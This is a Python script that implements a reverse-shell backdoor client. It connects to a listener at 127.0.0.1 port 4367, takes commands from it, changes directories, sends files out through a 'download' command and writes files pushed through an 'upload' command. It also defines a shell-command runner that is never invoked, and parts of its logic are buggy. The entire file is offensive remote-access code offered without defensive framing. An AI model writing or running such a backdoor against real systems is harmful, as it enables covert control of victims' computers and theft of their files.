import subprocess
import socket
import json
import os


backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
backdoor.connect(("127.0.0.1", 4367))

def command_handler(command):
	try:
		return subprocess.check_output(command, shell = True)
	except:
		return "[-] Error command".encode("utf-8")


def sending_command(command):
	backdoor.send(command)

def taking_output():
	data = backdoor.recv(1024)
	while data:
		return data.decode("utf-8")
		data = backdoor.recv(1024)


def exit_command(command):
	if command == "exit":
		backdoor.close()
		exit()

def change_directory(path):
	try:
		os.chdir(path)
		backdoor.send(f"[+] directory is changin on {path}".encode("utf-8"))
	except OSError:
		pass


def read_file(path):
	with open(path, mode = 'rb') as file:
		data = file.read(1024)

		while data:
			backdoor.send(data)
			data = file.read(1024)

		file.close()

def write_file(path, data):
	with open(path, mode = 'wb') as file:
		data = backdoor.recv(1024)

		while data:
			file.write(data)
			data = backdoor.recv(1024)

		file.close()

def run():
	while True:
		command = taking_output()
		command_split = command.split(" ")

		exit_command(command_split[0])

		if command_split[0] == "cd" and len(command_split) > 1:
			change_directory(command_split[1])

		if command_split[0] == "download":
			path = command_split[1]
			read_file(path)

		elif command_split[0] == "upload":
			path = command_split[1]
			data = taking_output()
			write_file(path, data)


	backdoor.close()

run()